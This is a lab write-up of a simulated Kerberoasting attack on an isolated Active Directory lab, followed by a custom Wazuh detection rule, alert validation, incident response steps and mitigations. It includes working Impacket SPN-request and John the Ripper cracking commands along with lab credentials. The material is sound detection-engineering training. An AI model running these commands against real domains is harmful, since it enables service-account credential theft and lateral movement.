# Lab 04 - Kerberoasting Attack and Detection

**Category:** Offensive Security + Detection Engineering  
**Difficulty:** Intermediate-Advanced  
**Attacker:** Kali Linux (`10.0.0.117`)  
**Target:** DC01 - lab.local domain (`10.0.0.200`)  
**SIEM:** Wazuh Manager (`10.0.0.166`)  
**MITRE ATT&CK:** T1558.003 - Kerberoasting  
**Date:** April 2026

---

## Overview

Simulated a Kerberoasting attack against a Windows Active Directory environment using a compromised low-privilege domain account, cracked the extracted service ticket hash offline, and built a custom Wazuh detection rule to catch it using Windows Event ID 4769 with RC4 encryption as the indicator.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Impacket (GetUserSPNs) | Enumerate SPNs and request TGS tickets |
| John the Ripper | Offline hash cracking |
| Wazuh SIEM | Detection and alerting |
| Custom Wazuh Rule 100200 | Kerberoasting-specific detection logic |

---

## Background

Kerberos is the authentication protocol used by Active Directory. When a user needs to access a service, they request a Ticket Granting Service (TGS) ticket from the domain controller. That ticket is encrypted using the service account's password hash.

The problem is that any authenticated domain user can request a TGS for any service account. The DC doesn't check whether the requester actually needs access, it just hands over the encrypted ticket. An attacker can take that ticket offline and brute force the password without ever touching the network again, and without triggering any account lockouts.

```
jsmith (low-priv) -> Request TGS for sqlsvc -> DC issues encrypted ticket
-> Extract hash -> Offline brute force -> plaintext password recovered
-> No lockout, no default alerts, no elevated privileges required
```

MITRE ATT&CK classifies this as T1558.003 under the Credential Access tactic.

---

## Attack Chain

```
Compromised account (jsmith)
    -> SPN enumeration via Impacket
    -> TGS ticket requested for sqlsvc (RC4 encryption)
    -> Hash extracted from ticket
    -> Offline cracking with John the Ripper
    -> sqlsvc password recovered: MSSQLSvc2024!
```

---

## Phase 1 - SPN Enumeration

Used Impacket's GetUserSPNs to find all service accounts with SPNs registered in the domain, authenticating as jsmith:

```bash
impacket-GetUserSPNs lab.local/jsmith:Password123! -dc-ip 10.0.0.200 -request
```

Output:

```
ServicePrincipalName          Name    MemberOf  PasswordLastSet
----------------------------  ------  --------  ---------------
MSSQLSvc/dc01.lab.local:1433  sqlsvc            2026-04-19
MSSQLSvc/dc01.lab.local:1443  sqlsvc            2026-04-19
```

sqlsvc has an SPN registered which makes it a Kerberoasting target. Impacket automatically requested the TGS ticket and returned the hash in one step.

---

## Phase 2 - Hash Extraction

The hash came back directly in the Impacket output:

```
$krb5tgs$23$*sqlsvc$LAB.LOCAL$lab.local/sqlsvc*$77b9a5d1fa6a300e9a93e95d90db474f$...
```

The `$krb5tgs$23$` prefix indicates etype 23 which is RC4-HMAC. That matters for detection later. Saved the hash to a file:

```bash
impacket-GetUserSPNs lab.local/jsmith:Password123! -dc-ip 10.0.0.200 -request > kerberoast.txt
```

---

## Phase 3 - Offline Password Cracking

Ran John the Ripper against the hash. No network traffic involved at this stage, no lockouts possible:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

Result:

```
MSSQLSvc2024!    (sqlsvc)
```

Password cracked. An attacker with this credential could authenticate as sqlsvc to any SQL Server in the domain, move laterally, or use the account for persistence.

---

## Phase 4 - Detection Engineering

Event ID 4769 is logged every time a Kerberos service ticket is requested. The problem is that 4769 events are extremely noisy in any AD environment. Every service access generates one. Wazuh's default rules don't distinguish Kerberoasting from normal ticket requests.

The detection angle is the encryption type. Kerberoasting tools request RC4 encrypted tickets (0x17) because RC4 is faster to crack offline. Modern systems use AES (0x12 or 0x11) by default. A 4769 event with RC4 encryption targeting a non-machine account is a high-confidence Kerberoasting indicator.

First enabled Kerberos audit logging on DC01 so the events get generated:

```cmd
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
```

Then wrote a custom rule in `/var/ossec/etc/rules/local_rules.xml` on the Wazuh manager:

```xml
<group name="kerberoasting,">
  <rule id="100200" level="12">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4769$</field>
    <field name="win.eventdata.ticketEncryptionType">^0x17$</field>
    <field name="win.eventdata.targetUserName" negate="yes">^.*\$$</field>
    <description>Possible Kerberoasting attack detected - RC4 encrypted Kerberos ticket requested for $(win.eventdata.targetUserName)</description>
    <mitre>
      <id>T1558.003</id>
    </mitre>
  </rule>
</group>
```

The rule fires only when all three conditions are met: Event ID 4769, encryption type 0x17, and a non-machine account target (machine accounts end in $ and generate a lot of normal 4769 traffic). That combination produces very few false positives.

---

## Phase 5 - Alert Validation

Re-ran the attack after deploying the rule. Wazuh fired rule 100200 within 30 seconds:

```
rule.id:              100200
rule.level:           12 (Critical)
rule.description:     Possible Kerberoasting attack detected - RC4 encrypted
                      Kerberos ticket requested for jsmith@LAB.LOCAL
rule.mitre.id:        T1558.003
rule.mitre.tactic:    Credential Access
rule.mitre.technique: Kerberoasting

agent.name:                              DC01
data.win.eventdata.serviceName:          sqlsvc
data.win.eventdata.targetUserName:       jsmith@LAB.LOCAL
data.win.eventdata.ticketEncryptionType: 0x17
data.win.eventdata.ipAddress:            ::ffff:10.0.0.117
data.win.system.eventID:                 4769
timestamp:                               2026-04-19T20:22:01.813Z
```

The attacker IP (10.0.0.117) is visible in the ipAddress field, which gives an analyst an immediate containment target.

---

## Detection Summary

| Indicator | Value |
|-----------|-------|
| Attack Type | Kerberoasting |
| Attacker Account | jsmith@LAB.LOCAL |
| Target Service | sqlsvc |
| Attacker IP | 10.0.0.117 |
| Detection Method | Custom Wazuh rule 100200 |
| Key Indicator | Event ID 4769 + Encryption Type 0x17 (RC4) |
| MITRE ATT&CK | T1558.003 - Kerberoasting |
| Alert Level | 12 (Critical) |
| Time to Detect | Under 30 seconds |

---

## Incident Response

The first priority after this alert fires is rotating the sqlsvc password immediately since the attacker may have already cracked it. From there, jsmith needs to be investigated to figure out how that account was compromised in the first place. Check logon history and source IPs for anything unusual.

Search for lateral movement using the sqlsvc credentials and look for other 4769 + RC4 events across the environment to see if other accounts were targeted. A full SPN audit is also worth running:

```cmd
setspn -Q */* | findstr -v "CN=DC"
```

---

## Defensive Recommendations

The most effective fix is migrating service accounts to Group Managed Service Accounts. gMSA passwords are 120 characters, randomly generated, and rotated automatically by Active Directory. There is nothing to Kerberoast.

Disabling RC4 Kerberos encryption via Group Policy also breaks the attack entirely since Kerberoasting depends on being able to request RC4 tickets. Strong random passwords on service accounts make cracking infeasible even if a ticket is obtained. Regular SPN audits help reduce the attack surface by removing SPNs from accounts that don't need them.

---

## References

- [MITRE ATT&CK T1558.003 - Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [Impacket GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- [Wazuh Custom Rules Documentation](https://documentation.wazuh.com/current/user-manual/ruleset/custom.html)
- [Microsoft Event ID 4769](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)
- [Defending Against Kerberoasting - SANS](https://www.sans.org/blog/defending-against-kerberoasting/)
